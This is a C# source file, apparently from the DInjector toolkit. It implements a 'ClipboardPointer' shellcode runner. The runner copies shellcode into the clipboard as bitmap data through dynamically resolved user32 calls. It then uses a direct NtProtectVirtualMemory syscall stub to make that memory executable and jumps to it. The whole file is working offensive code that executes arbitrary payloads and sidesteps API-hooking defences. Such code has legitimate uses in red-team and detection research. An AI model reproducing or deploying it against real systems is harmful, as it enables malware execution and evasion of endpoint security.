using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

using DI = DInvoke;

namespace DInjector
{
    class ClipboardPointer
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool OpenClipboard(
            IntPtr hWndNewOwner);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate IntPtr SetClipboardData(
            uint uFormat,
            byte[] hMem);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool CloseClipboard();

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtProtectVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ref IntPtr RegionSize,
            uint NewProtect,
            out uint OldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate void pFunction();

        private static bool openClipboard(IntPtr hWndNewOwner)
        {
            object[] parameters = { hWndNewOwner };
            var result = (bool)DI.DynamicInvoke.Generic.DynamicAPIInvoke("user32.dll", "OpenClipboard", typeof(OpenClipboard), ref parameters);

            return result;
        }

        private static IntPtr setClipboardData(uint uFormat, byte[] hMem)
        {
            object[] parameters = { uFormat, hMem };
            var result = (IntPtr)DI.DynamicInvoke.Generic.DynamicAPIInvoke("user32.dll", "SetClipboardData", typeof(SetClipboardData), ref parameters);

            return result;
        }

        private static bool closeClipboard()
        {
            object[] parameters = { };
            var result = (bool)DI.DynamicInvoke.Generic.DynamicAPIInvoke("user32.dll", "CloseClipboard", typeof(CloseClipboard), ref parameters);

            return result;
        }

        public static void Execute(byte[] shellcodeBytes)
        {
            var shellcode = shellcodeBytes;

            #region SetClipboardData

            openClipboard(IntPtr.Zero);

            IntPtr clipboardData = setClipboardData(
                0x2, // CF_BITMAP
                shellcode);

            closeClipboard();

            #endregion

            #region NtProtectVirtualMemory (PAGE_EXECUTE_READ)

            IntPtr stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtProtectVirtualMemory");
            NtProtectVirtualMemory sysNtProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));

            IntPtr baseAddress = clipboardData;
            IntPtr regionSize = (IntPtr)shellcode.Length;

            DI.Data.Native.NTSTATUS ntstatus = sysNtProtectVirtualMemory(
                Process.GetCurrentProcess().Handle,
                ref baseAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
                out uint _);

            if (ntstatus == 0)
                Console.WriteLine("(ClipboardPointer) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
            else
                Console.WriteLine($"(ClipboardPointer) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");

            pFunction f = (pFunction)Marshal.GetDelegateForFunctionPointer(clipboardData, typeof(pFunction));
            f();

            #endregion
        }
    }
}
